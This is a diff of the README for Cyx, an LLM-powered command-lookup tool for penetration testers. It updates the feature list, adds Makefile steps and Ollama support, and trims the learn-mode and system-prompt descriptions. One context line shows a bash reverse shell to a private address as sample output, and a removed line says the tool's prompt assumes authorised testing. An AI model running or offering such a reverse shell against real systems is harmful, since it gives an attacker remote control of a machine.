@@ -1,14 +1,14 @@
 # Cyx
 
-> Command-first cybersecurity companion for penetration testers and security researchers
-
-Cyx is an LLM-powered terminal tool that delivers instant, executable security commands. Supports Perplexity (web search) and Groq (fast inference).
+LLM-powered terminal tool for security command lookup. Supports Perplexity, Groq, and Ollama.
 
 ## Features
 
-- **Command-first output** - executable commands before explanations
-- **Learn mode** - detailed educational breakdowns with sources
-- **Source attribution** - tracks provider, model, and web search status
+- Command-first output with code blocks
+- Learn mode for detailed explanations
+- Smart cache with ONNX semantic search
+- Local LLM support via Ollama
+- Source attribution and links
 
 ## Quick Start
 
@@ -43,6 +43,16 @@ cargo build --release
 
 # Optional: install to PATH
 cargo install --path .
+```
+
+### Using the Makefile
+
+```bash
+make build    # Build and create symlink
+make check    # Run fmt + clippy
+make install  # Install to system PATH
+make setup    # Run setup wizard
+make help     # Show all commands
 ```
 
 ### Initial Configuration
@@ -113,11 +123,11 @@ Links:
 
 ### Learn Mode
 
-Detailed breakdowns with flag explanations, how it works, advantages/disadvantages, alternatives, and cited sources.
-
 ```bash
 cyx --learn "nmap stealth scan"
 ```
+
+Provides detailed explanations with flag breakdowns, protocol details, and alternatives.
 
 ### Quiet Mode
 
@@ -137,9 +147,7 @@ bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 
 ### System Prompts
 
-**Normal mode**: Command-first responses with minimal explanation, assumes authorized testing context, prioritizes executable commands over theory.
-
-**Learn mode**: Educational responses with detailed flag breakdowns, protocol explanations, cited sources, advantages/disadvantages, and alternatives.
+Normal mode prioritizes executable commands with brief explanations. Learn mode provides detailed educational content with examples and alternatives.
 
 ## Disclaimer
 
